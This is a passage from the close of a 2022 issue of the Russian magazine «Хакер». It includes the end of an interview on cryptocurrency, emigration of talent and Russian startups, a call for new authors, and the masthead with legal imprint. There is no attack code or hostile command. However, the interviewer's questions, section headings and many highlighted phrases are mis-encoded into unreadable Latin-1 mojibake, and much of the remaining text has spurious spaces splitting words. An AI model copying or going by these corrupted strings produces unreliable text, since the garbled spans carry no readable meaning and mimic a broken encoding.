рового рубля, чем у нас ЦБ страдает ради хайпа. Какие могут быть перспек -
тивы? Американ цы (а в мире пока господству ет долларовая финан совая сис-
тема) не позволят тому же бит коину стать средством платежа, они живут
за счет эмиссии своего доллара.


— À èç äðóãèõ ñîâðåìåííûõ òðåíäîâ â òåõíîëîãèÿõ ÷òî ïðèâëåêàåò
òâîå âíèìàíèå?
— Децен трализация, децен трализован ные сети. Есть одна идея кое-что сде-
лать. Но технология эта не особен но-то новая.


— Â íà÷àëå êíèãè òû ïèøåøü ïðî ZX Spectrum, «êâàäðàò» íà óëèöå,
BBS, ëîêàëüíóþ ñåòü â îáùàãå, ïðîãðàììèðîâàíèå ãðàôèêè. Âñå,
êîìó ýòî õîðîøî çíàêîìî, — ïîòåðÿííîå ïîêîëåíèå?
— Потерян ное поколение — это те, кто уехал. Это умные ребята, которые
не наш ли себе здесь места, которые мог ли бы двигать науку или страну. Таких
людей не так много. У нас в физико-математическом классе математику знали
единицы, а физику еще мень ше. Отличников штам повали по приказу дирек -
тора, чтобы держать марку лучшей школы района или даже области. В универ-
ситете на моем курсе реаль но разбирающихся так же мало было. Все, кто дей-
ствитель но учился, уехали в Европу. Вот они и есть то потерян ное поколение.


— À êàêîå êèáåðïîêîëåíèå ñëåäóåò çà íèì? Îíè óæå íå òåðÿþòñÿ,
äåëàþò Flipper Zero, êðèïòîñòàðòàïû è ïðî÷åå?
— Разве что-то силь но изменилось? Ты можешь привести много примеров
прорывных IT-стартапов в России? Ког да ребята в гараже собрались и сде-
лали? У нас, по сути, есть толь ко копии — Яндекс, VK, Mail.ru. Эти сервисы
нужны были в первую очередь для государствен ной безопасности и получали
соот ветству ющее  финан сирование.  Получить  в  России  финан сирование
под свой проект фак тически невозможно, кредитов для малого бизнеса тоже
фак тически нет. Ведь утечка мозгов продолжает ся. Мне нравит ся под ход Син -
гапура в области образования и охоты за талан тами. Тех, кто выделялся спо-
собностями, они отправляли обу чать ся за рубеж, а потом тру доустраивали
в крупные корпорации, правитель ство. Так и выросла страна из треть его мира
в первый.


— Ïðî îáðàçîâàíèå. ×òî ñàìîå öåííîå òû âûíåñ èç ó÷åáû â
ÑÏáÃÓ?
— То, что я напрасно потерял два с половиной года. :)


— Åñëè áû òû ìîã âåðíóòüñÿ â ëþáîé ìîìåíò ñâîåé æèçíè è
ïðèíÿòü òàì äðóãîå ðåøåíèå, ÷òî áû òû èçìåíèë?
— Ничего.
«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.




Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
    №08 (281)

           Андрей Пись менный     Ва лентин Холмогоров        Илья Русанен
               Главный редактор          Ведущий редак тор              Разработка
                pismenny@glc.ru           valentin@holmogorov.ru           rusanen@glc.ru
                                   Евгения Шарипова
                                      Литера тур ный редактор


                           MEGANEWS

                             Мария Нефёдова
                                             nefedova@glc.ru


                                    АРТ

                                        yambuto
                                        yambuto@gmail.com


                     КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                    Олег Афонин, Иван Андреев,
                                 Марк Бруцкий-Стемпковский,
                                           Nik Zerof, Евгений Зобнин,
                                    Юрий Язев


                              РЕКЛАМА

                                    Анна Яков лева
                                    Директор по спецпроектам
                                              yakovleva.a@glc.ru


                     РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                        Воп росы по подписке:      Воп росы по материалам:
                                  lapina@glc.ru                support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, стро ение 1, этаж 8, помещение IX, комната 54, офис 7. Изда тель: ИП Югай
Александр Оле гович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080, город Мос -
ква, Волоколам ское шоссе, дом 1, стро ение 1, этаж 8, помеще ние IX, комната 54, офис 7. Зарегистри рова но в Федеральной службе по надзору
в сфере свя зи, информа ционных тех нологий и массовых коммуника ций (Роскомнад зоре), свидетельство Эл № ФС77-67001 от 30.08.2016 года.
Мнение редак ции не обя зательно совпадает с мнением авторов. Все материалы в номере предоставляются как информа ция к размышлению. Лица,
использующие данную информацию в противозаконных целях, могут быть привлечены к ответствен ности. Редакция не несет ответственности
за содержание рекламных объявле ний в номере. По вопросам лицензирования и получения прав на использование редакционных материалов жур -
нала обращайтесь по адре су: xakep@glc.ru. © Журнал «Хакер», РФ, 2022